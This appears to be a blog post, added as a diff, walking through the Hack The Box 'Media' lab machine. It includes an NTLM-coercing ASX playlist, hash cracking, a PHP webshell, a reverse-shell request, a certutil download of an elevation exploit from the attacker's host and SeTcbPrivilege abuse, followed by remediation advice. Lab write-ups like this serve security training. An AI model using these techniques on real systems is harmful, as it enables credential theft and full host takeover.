@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/media]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: Media (medium)">
+  <meta property="og:description" content="Black-box Windows box: a &#x27;WMP-compatible&#x27; upload form takes an ASX/WAX playlist that coerces NTLM auth to Responder, the cracked user hash gives SSH, a XAMPP directory junction turns the upload folder into the web root for a PHP webshell as local service, and SeTcbPrivilege adds the user to Administrators for root.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/media.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: Media (medium)">
+  <meta name="twitter:description" content="Black-box Windows box: a &#x27;WMP-compatible&#x27; upload form takes an ASX/WAX playlist that coerces NTLM auth to Responder, the cracked user hash gives SSH, a XAMPP directory junction turns the upload folder into the web root for a PHP webshell as local service, and SeTcbPrivilege adds the user to Administrators for root.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: Media (medium)</h1>
+    <p class="post-meta">2026-10-21 &middot; <a class="post-cat" href="index.html#cat-htb-cpts-track-writeups">HTB &quot;CPTS Track&quot; writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a><a class="tag" href="tag/web.html" data-tag="web">#web</a><a class="tag" href="tag/file-upload.html" data-tag="file-upload">#file-upload</a><a class="tag" href="tag/ntlm-leak.html" data-tag="ntlm-leak">#ntlm-leak</a><a class="tag" href="tag/responder.html" data-tag="responder">#responder</a><a class="tag" href="tag/directory-junction.html" data-tag="directory-junction">#directory-junction</a><a class="tag" href="tag/setcbprivilege.html" data-tag="setcbprivilege">#setcbprivilege</a><a class="tag" href="tag/windows-privilege-escalation.html" data-tag="windows-privilege-escalation">#windows-privilege-escalation</a></p>
+    <p class="post-abstract">Black-box Windows box: a &#x27;WMP-compatible&#x27; upload form takes an ASX/WAX playlist that coerces NTLM auth to Responder, the cracked user hash gives SSH, a XAMPP directory junction turns the upload folder into the web root for a PHP webshell as local service, and SeTcbPrivilege adds the user to Administrators for root.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#the-upload-form">The upload form</a></li>
+</ul>
+</li>
+<li><a href="#foothold-ntlm-coercion-to-ssh">Foothold: NTLM Coercion to SSH</a><ul>
+<li><a href="#coercing-the-hash">Coercing the hash</a></li>
+<li><a href="#crack-and-log-in">Crack and log in</a></li>
+</ul>
+</li>
+<li><a href="#lateral-movement-xampp-junction-to-local-service">Lateral Movement: XAMPP Junction to local service</a></li>
+<li><a href="#root-setcbprivilege">Root: SeTcbPrivilege</a></li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/Media1.png" /></p>
+<p>Media is a medium Windows box that hangs on one clever idea: an upload form that asks for a video "compatible with Windows Media Player". That phrasing is the whole foothold. Instead of a real video you hand it a WMP <em>playlist</em> that points at your own SMB share, and the HR reviewer's machine authenticates to you. From there it's a cracked hash, a neat Windows directory-junction trick to get code execution as the web server, and a dangerous service privilege to finish.</p>
+<ol>
+<li>The upload form takes a <strong><code>.wax</code>/<code>.asx</code> playlist</strong>; point its <code>REF</code> at a UNC path and the reviewer's WMP coerces an <strong>NTLM auth to Responder</strong>.</li>
+<li>Crack <code>enox</code>'s NetNTLMv2 hash (<code>1234virus@</code>) and <strong>SSH in</strong> for the user flag.</li>
+<li><code>enox</code> controls the upload directory, so <strong>junction it onto <code>C:\xampp\htdocs</code></strong> and upload a PHP webshell for RCE as <code>nt authority\local service</code>.</li>
+<li>Local service holds <strong><code>SeTcbPrivilege</code></strong>, abuse it to add <code>enox</code> to <strong>Administrators</strong>, then re-login for root.</li>
+</ol>
+<blockquote>
+<p>No creds to start, black-box from the Nmap scan.</p>
+</blockquote>
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.234.67<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT     STATE SERVICE            VERSION
+22/tcp   open  ssh                OpenSSH for_Windows_9.5 (protocol 2.0)
+80/tcp   open  http               Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-title: ProMotion Studio
+3389/tcp open  ssl/ms-wbt-server?
+|_  rdp-ntlm-info: NetBIOS_Computer_Name: MEDIA
+</code></pre></div>
+
+<p>Windows host <code>MEDIA</code> with SSH, RDP, and an Apache/PHP stack on 80 (a XAMPP smell already, given Apache + PHP on Windows). The web app is the only unauthenticated attack surface.</p>
+<h3 id="the-upload-form">The upload form<a class="headerlink" href="#the-upload-form" title="link to this section">&para;</a></h3>
+<p>The site is "ProMotion Studio", a hiring page. The interesting part is the application form, which asks for a first name, last name, email, and an <strong>"introduction video (compatible with Windows Media Player)"</strong>:</p>
+<p><img alt="" src="../images/Media2.png" /></p>
+<p>That one parenthetical is the hint. "Compatible with Windows Media Player" means a human reviewer is going to <em>open my file in WMP</em>. WMP doesn't just play media files; it also opens <strong>playlists</strong> (<code>.asx</code>, <code>.wax</code>, <code>.m3u</code>) that <em>reference</em> media by path, including UNC paths. After some reading I landed on the <a href="https://filext.com/file-extension/WAX">WAX format</a>, a WMP redirect file that points at a stream rather than containing one.</p>
+<blockquote>
+<p><strong>Why this works:</strong> a WMP playlist entry (<code>&lt;REF HREF="..."&gt;</code>) can point at <code>\\attacker\share\file.wma</code>. When WMP resolves that UNC path, Windows transparently authenticates to the SMB share with the current user's credentials, handing over a NetNTLMv2 response. The upload form's "HR will review your video" is the delivery mechanism: the reviewer opens my playlist, and their machine coughs up a hash. I never need the video to play.</p>
+</blockquote>
+<hr />
+<h2 id="foothold-ntlm-coercion-to-ssh">Foothold: NTLM Coercion to SSH<a class="headerlink" href="#foothold-ntlm-coercion-to-ssh" title="link to this section">&para;</a></h2>
+<h3 id="coercing-the-hash">Coercing the hash<a class="headerlink" href="#coercing-the-hash" title="link to this section">&para;</a></h3>
+<p>Craft a minimal ASX playlist whose reference is a UNC path back to my box:</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">&lt;ASX</span><span class="w"> </span><span class="na">VERSION=</span><span class="s">"3.0"</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;ENTRY&gt;</span>
+<span class="w">    </span><span class="nt">&lt;REF</span><span class="w"> </span><span class="na">HREF=</span><span class="s">"\\\\10.10.14.137\\SHARE\\file.wma"</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/ENTRY&gt;</span>
+<span class="nt">&lt;/ASX&gt;</span>
+</code></pre></div>
+
+<p>Start Responder to catch the SMB authentication:</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0
+</code></pre></div>
+
+<p>Then submit the form, intercepting the POST in Burp. I first upload any image to get a valid multipart request, then swap the file body for the ASX payload and rename the file to <code>1kb2.wax</code>:</p>
+<p><img alt="" src="../images/Media3.png" /></p>
+<p>The response confirms the social-engineering premise, the "video" is queued for a human to review:</p>
+<p><img alt="" src="../images/Media4.png" /></p>
+<p>A short wait later, Responder catches <code>MEDIA\enox</code> authenticating:</p>
+<div class="codehilite"><pre><span></span><code>[SMB] NTLMv2-SSP Username : MEDIA\enox
+[SMB] NTLMv2-SSP Hash     : enox::MEDIA:488ce6c798a9a138:E0BF2A738F6D5539ECEBC938E956DA1E:0101...(trimmed)
+</code></pre></div>
+
+<h3 id="crack-and-log-in">Crack and log in<a class="headerlink" href="#crack-and-log-in" title="link to this section">&para;</a></h3>
+<p>NetNTLMv2 is hashcat mode <code>5600</code>:</p>
+<div class="codehilite"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>ENOX::MEDIA:488ce6c798a9a138:e0bf2a738f6d5539ecebc938e956da1e:0101...(trimmed):1234virus@
+</code></pre></div>
+
+<p>Cracked: <strong><code>enox / 1234virus@</code></strong>. SSH is open, so straight in:</p>
+<div class="codehilite"><pre><span></span><code>ssh<span class="w"> </span>enox@10.129.84.0
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PS C:\Users\enox\Desktop&gt; cat .\user.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>user.txt captured.</strong></p>
+<blockquote>
+<p>A note on IPs: the box changed address between sessions (<code>10.129.234.67</code> during enum, <code>10.129.84.0</code> from here on). Same box.</p>
+</blockquote>
+<hr />
+<h2 id="lateral-movement-xampp-junction-to-local-service">Lateral Movement: XAMPP Junction to <code>local service</code><a class="headerlink" href="#lateral-movement-xampp-junction-to-local-service" title="link to this section">&para;</a></h2>
+<p>I'll be upfront: I leaned on the official writeup for this part, the junction idea isn't one I'd have reached for cold.</p>
+<p>The web root is a XAMPP install at <code>C:\xampp\htdocs</code>, and <code>index.php</code> saves each uploaded "video" into a per-submission folder under <code>C:\Windows\Tasks\Uploads\</code>. The folder name is <code>md5(firstname + lastname + email)</code>, so my <code>test</code> / <code>test</code> / <code>test@test.com</code> submission lands in <code>44b85c98e94039c8a0a015f6d3a3449e</code>. Crucially, <code>enox</code> has <strong>Full Control</strong> over <code>C:\Windows\Tasks\Uploads</code>.</p>
+<blockquote>
+<p><strong>Why this works:</strong> the upload handler writes into a directory the attacker controls, but the useful target (the Apache web root) isn't directly writable. A <strong>directory junction</strong> bridges the two. If I delete my upload folder and recreate it as a junction pointing at <code>C:\xampp\htdocs</code>, then the <em>next</em> upload with the same form values is written, through the junction, straight into the web root, where Apache will execute it. Junctions are the Windows equivalent of a directory symlink and don't need admin rights to create.</p>
+</blockquote>
+<p>Delete the real upload folder and replace it with a junction onto the web root:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">Uploads</span><span class="p">&gt;</span> <span class="nb">Remove-Item</span> <span class="p">.\</span><span class="n">44b85c98e94039c8a0a015f6d3a3449e</span><span class="p">\</span> <span class="n">-Recurse</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">Uploads</span><span class="p">&gt;</span> <span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Junction</span> <span class="n">-Path</span> <span class="s2">"C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e"</span> <span class="n">-Target</span> <span class="s2">"C:\xampp\htdocs"</span>
+</code></pre></div>
+
+<p>Now re-submit the form with the <strong>same</strong> first/last/email values (so the md5 folder matches), but this time the file is a PHP webshell:</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p><img alt="" src="../images/Media5.png" /></p>
+<p>The file lands in <code>htdocs</code>, and hitting it with a base64 PowerShell reverse shell (Powershell #3 from revshells.com) drops a shell as the Apache service account:</p>
+<div class="codehilite"><pre><span></span><code>http://10.129.84.0/1kb2.php?cmd=powershell.exe -e JABjAGwAaQBlAG4AdAAg...(base64, trimmed)
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>$ nc -lvnp 6868
+Connection received on 10.129.84.0 55669
+PS C:\xampp\htdocs&gt; whoami
+nt authority\local service
+</code></pre></div>
+
+<p><img alt="" src="../images/Media6.png" /></p>
+<hr />
+<h2 id="root-setcbprivilege">Root: SeTcbPrivilege<a class="headerlink" href="#root-setcbprivilege" title="link to this section">&para;</a></h2>
+<p><code>local service</code> is unprivileged in the usual sense, but its token carries one very dangerous privilege:</p>
+<div class="codehilite"><pre><span></span><code>PS C:\xampp\htdocs&gt; whoami /priv
+
+Privilege Name                Description                         State
+============================= =================================== ========
+SeTcbPrivilege                Act as part of the operating system Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeCreateGlobalPrivilege       Create global objects               Enabled
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why <code>SeTcbPrivilege</code> is game over:</strong> "act as part of the operating system" lets a process build arbitrary access tokens, including tokens that claim membership in any group, such as Administrators. It's one of the most powerful privileges in Windows; holding it is effectively SYSTEM. It shows as <code>Disabled</code> here, but a process can enable a privilege it already holds, so that doesn't save the box.</p>
+</blockquote>
+<p>I used <a href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">antonioCoco's <code>TcbElevation</code> PoC</a>, which forges an elevated token and runs a command with it. Pull it over and point it at <code>net localgroup</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">&gt;</span> <span class="n">certutil</span><span class="p">.</span><span class="n">exe</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">137</span><span class="p">/</span><span class="n">TcbElevation-x64</span><span class="p">.</span><span class="n">exe</span> <span class="n">TcbElevation-x64</span><span class="p">.</span><span class="n">exe</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">&gt;</span> <span class="p">./</span><span class="n">TcbElevation-x64</span><span class="p">.</span><span class="n">exe</span> <span class="n">2kb1</span><span class="nv">@1kb2</span><span class="p">.</span><span class="n">xyz</span> <span class="s1">'net localgroup Administrators enox /add'</span>
+<span class="n">Error</span> <span class="n">starting</span> <span class="n">service</span> <span class="n">1053</span>
+</code></pre></div>
+
+<p>The first run threw <code>Error starting service 1053</code>, and it took a couple of retries before it actually stuck. Eventually <code>enox</code> showed up in the group:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">enox</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
+<span class="n">Members</span>
+<span class="p">-------------------------------------------------------------------------------</span>
+<span class="n">Administrator</span>
+<span class="n">enox</span>
+</code></pre></div>
+
+<p>The catch: my existing shells still carried their old tokens, so <code>C:\Users\Administrator</code> kept returning "Access denied" even after <code>enox</code> was an admin. A group change only lands in a <strong>new</strong> logon session, so I reconnected over SSH to get a fresh token, and that session could finally read the Administrator profile:</p>
+<div class="codehilite"><pre><span></span><code>enox@MEDIA C:\Users\Administrator\Desktop&gt;type root.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Don't let an upload dictate an outbound UNC fetch.</strong> Validate uploaded files by content, not by "WMP opens it", and block the server/clients from reaching out to arbitrary SMB. Egress-filter SMB (445) at the perimeter so a coerced hash never leaves.</li>
+<li><strong>Keep the web root off attacker-controlled paths.</strong> The upload directory shouldn't be fully writable by a low-priv user, and canonicalising/validating the upload path (refusing reparse points/junctions) kills the htdocs write.</li>
+<li><strong>Don't run the app pool with <code>SeTcbPrivilege</code>.</strong> That privilege on a service account is an instant local-admin path. Strip it; the Apache/PHP service has no need for it.</li>
+<li><strong>Patch the weak password.</strong> <code>1234virus@</code> fell to rockyou instantly; enforce length and complexity so a coerced NetNTLMv2 isn't crackable offline.</li>
+</ul>
+<hr />
+<p>References:</p>
+<ul>
+<li><a href="https://filext.com/file-extension/WAX">WAX file format (filext)</a></li>
+<li><a href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">antonioCoco, SeTcbPrivilege <code>TcbElevation</code> PoC</a></li>
+<li><a href="https://www.revshells.com/">revshells.com</a></li>
+</ul>
+  </main>
+  <nav class="related" aria-label="Related posts">
+    <h2 class="related-h">related</h2>
+    <ul class="posts">
+      <li class="post"><a class="post-title" href="pov.html">HTB CPTS Track: Pov (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/web.html" data-tag="web">#web</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a><a class="tag" href="tag/windows-privilege-escalation.html" data-tag="windows-privilege-escalation">#windows-privilege-escalation</a></span></li>
+      <li class="post"><a class="post-title" href="fluffy.html">HTB CPTS Track: Fluffy (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/ntlm-leak.html" data-tag="ntlm-leak">#ntlm-leak</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="tombwatcher.html">HTB CPTS Track: TombWatcher (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="trick.html">HTB CPTS Track: Trick (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/web.html" data-tag="web">#web</a></span></li>
+      <li class="post"><a class="post-title" href="jeeves.html">HTB CPTS Track: Jeeves (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+    </ul>
+  </nav>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
